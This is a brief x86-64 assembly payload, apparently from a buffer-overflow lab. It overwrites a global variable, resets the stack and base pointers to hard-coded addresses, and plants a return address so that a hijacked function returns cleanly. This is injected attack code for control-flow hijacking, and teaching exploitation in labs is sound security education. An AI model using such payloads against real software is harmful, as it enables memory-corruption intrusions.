main:	
	movq $1, %rax 			# Hack a
	movq %rax, 0x601054

	movq $0x7FFFFFFFE2B0, %rsp 	# The rsp and rbp
	movq $0x7FFFFFFFEA80, %rbp

	movq $0x00400605, 8(%rbp)	# The return address
	movq $0x0, 12(%rbp)

	leave				# Return to the correct place
	retq
